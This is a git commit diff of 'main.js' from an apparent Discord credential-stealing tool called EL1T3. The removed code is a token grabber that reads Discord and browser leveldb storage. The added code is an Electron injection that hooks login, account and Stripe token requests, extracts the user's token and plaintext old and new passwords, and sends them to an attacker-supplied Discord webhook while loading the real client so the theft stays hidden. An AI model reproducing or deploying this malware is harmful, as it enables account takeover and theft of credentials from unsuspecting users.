ff1944eacaab5542265f419547687e4c31496020
Ѵιcнч"RCΛ#1337 <66045929+Its-Vichy@users.noreply.github.com>
2021-06-19 05:18:35 +0200

    ⚒️ Bêta payload
    ⚙️ - Removing token grabber from file (due to webhook spam)
    ⚙️ - Adding requests handler

--- main.js
+++ main.js
@@ -1,63 +1,55 @@
-async function EL1T3() {
-    const { readdir, readFile } = require('fs');
-
-    async function GR4B() {
-        const discord_path = [
-            `${__dirname.split(`:`)[0]}:/Users/${__dirname.split(`\\`)[2]}/AppData/Roaming/Discord/Local Storage/leveldb`,
-            `${__dirname.split(`:`)[0]}:/Users/${__dirname.split(`\\`)[2]}/AppData/Roaming/Lightcord/Local Storage/leveldb`,
-            `${__dirname.split(`:`)[0]}:/Users/${__dirname.split(`\\`)[2]}/AppData/Roaming/discordptb/Local Storage/leveldb`,
-            `${__dirname.split(`:`)[0]}:/Users/${__dirname.split(`\\`)[2]}/AppData/Roaming/discordcanary/Local Storage/leveldb`,
-            `${__dirname.split(`:`)[0]}:/Users/${__dirname.split(`\\`)[2]}/AppData/Roaming/Opera Software/Opera Stable/Local Storage/leveldb`,
-            `${__dirname.split(`:`)[0]}:/Users/${__dirname.split(`\\`)[2]}/AppData/Roaming/Opera Software/Opera GX Stable/Local Storage/leveldb`,
-
-            `${__dirname.split(`:`)[0]}:/Users/${__dirname.split(`\\`)[2]}/AppData/Local/Amigo/User Data/Local Storage/leveldb`,
-            `${__dirname.split(`:`)[0]}:/Users/${__dirname.split(`\\`)[2]}/AppData/Local/Torch/User Data/Local Storage/leveldb`,
-            `${__dirname.split(`:`)[0]}:/Users/${__dirname.split(`\\`)[2]}/AppData/Local/Kometa/User Data/Local Storage/leveldb`,
-            `${__dirname.split(`:`)[0]}:/Users/${__dirname.split(`\\`)[2]}/AppData/Local/Orbitum/User Data/Local Storage/leveldb`,
-            `${__dirname.split(`:`)[0]}:/Users/${__dirname.split(`\\`)[2]}/AppData/Local/CentBrowser/User Data/Local Storage/leveldb`,
-            `${__dirname.split(`:`)[0]}:/Users/${__dirname.split(`\\`)[2]}/AppData/Local/7Star/7Star/User Data/Local Storage/leveldb`,
-            `${__dirname.split(`:`)[0]}:/Users/${__dirname.split(`\\`)[2]}/AppData/Local/Sputnik/Sputnik/User Data/Local Storage/leveldb`,
-            `${__dirname.split(`:`)[0]}:/Users/${__dirname.split(`\\`)[2]}/AppData/Local/Vivaldi/User Data/Default/Local Storage/leveldb`,
-            `${__dirname.split(`:`)[0]}:/Users/${__dirname.split(`\\`)[2]}/AppData/Local/Google/Chrome SxS/User Data/Local Storage/leveldb`,
-            `${__dirname.split(`:`)[0]}:/Users/${__dirname.split(`\\`)[2]}/AppData/Local/Epic Privacy Browser/User Data/Local Storage/leveldb`,
-            `${__dirname.split(`:`)[0]}:/Users/${__dirname.split(`\\`)[2]}/AppData/Local/Google/Chrome/User Data/Default/Local Storage/leveldb`,
-            `${__dirname.split(`:`)[0]}:/Users/${__dirname.split(`\\`)[2]}/AppData/Local/uCozMedia/Uran/User Data/Default/Local Storage/leveldb`,
-            `${__dirname.split(`:`)[0]}:/Users/${__dirname.split(`\\`)[2]}/AppData/Local/Microsoft/Edge/User Data/Default/Local Storage/leveldb`,
-            `${__dirname.split(`:`)[0]}:/Users/${__dirname.split(`\\`)[2]}/AppData/Local/Yandex/YandexBrowser/User Data/Default/Local Storage/leveldb`,
-            `${__dirname.split(`:`)[0]}:/Users/${__dirname.split(`\\`)[2]}/AppData/Local/Opera Software/Opera Neon/User Data/Default/Local Storage/leveldb`,
-            `${__dirname.split(`:`)[0]}:/Users/${__dirname.split(`\\`)[2]}/AppData/Local/BraveSoftware/Brave-Browser/User Data/Default/Local Storage/leveldb`,
-        ];
-
-        const token_regex = [
-            /[\d\w_-]{24}\.[\d\w_-]{6}\.[\d\w_-]{27}/,
-            /[\w-]{24}.[\w-]{6}.[\w-]{27}/,
-            /`mfa\.[\d\w_-]{84}`/,
-            /mfa\.[\w-]{84}/
-        ];
-        
-        let token_cache = [];
-        await discord_path.forEach(async path => {
-            await readdir(path, (err, files) => {
-                if (files === undefined) return;
-
-                files.filter(f => f.split('.').pop() === 'log' || 'lbd').forEach(filter => {
-                    readFile(`${path}/${filter}`, 'utf-8', async function(err, data) {
-                        await token_regex.forEach(async regex => {
-                            let [match] = await regex.exec(data) || [null];
-
-                            if (match != null && !token_cache.includes(match)) {
-                                const token = match.replace(/`/g, '');
-                                token_cache.push(token)
-                                console.log(token);
-                            };
-                        });
-                    });
-                });
-            });
-        });
+async function EL1T3(hook_url) {
+    const { BrowserWindow, session } = require('electron');
+    const { request } = require('https');
+    
+    async function REQ3ST(url, header, data, type) {
+        const req = request({headers: header, hostname: 'discord.com', method: type, port: 443, path: url });
+        req.write(JSON.stringify(data));
+        req.end();
     };
 
-    await GR4B();
+    async function S3ND(token, password, old_password) {
+        const embed = {
+            username: 'EL1T3',
+            content: '',
+            embeds: [
+                {
+                    'description': '> Token:\n```' + token + '```\n' + '> Password:\n```' + password + '```\n' + '> Old Password:\n```' + old_password + '```\n',
+                    'color': 0x0763fd,
+                    'footer': {
+                        'text': 'https://github.com/Its-Vichy/EL1T3'
+                    }                   
+                }
+            ]
+        };
+
+        REQ3ST(hook_url.split('discord.com')[1], { 'content-type': 'application/json' },  embed , 'POST');
+    };
+    
+    try {
+        const url_filter = {
+            urls: [
+                'https://*.discord.com/api/v*/auth/login',
+                'https://*.discord.com/api/v*/users/@me',
+                'https://discord.com/api/v*/auth/login',
+                'https://discord.com/api/v*/users/@me',
+                'https://api.stripe.com/v*/tokens'
+            ]
+        };
+
+        session.defaultSession.webRequest.onCompleted(url_filter, (details, callback) => {
+            const js_payload = `var req=webpackJsonp.push([[],{extra_id:(e,t,r)=>e.exports=r},[["extra_id"]]]);for(let e in req.c)if(req.c.hasOwnProperty(e)){let t=req.c[e].exports;if(t&&t.__esModule&&t.default)for(let e in t.default)"getToken"===e&&(token=t.default.getToken())} token`;
+            const payload = JSON.parse(Buffer.from(details.uploadData[0].bytes).toString());
+
+            BrowserWindow.getFocusedWindow().webContents.executeJavaScript(js_payload, true).then((async token => {
+                if (details.statusCode === 200) {
+                    await S3ND(token || 'none', payload.new_password || 'none', payload.password || 'none');
+                };
+            }));
+        });
+    }
+    catch { };  
 };
 
-EL1T3();
+EL1T3('PUT WEBHOOK HERE');
+module.exports = require('./core.asar');
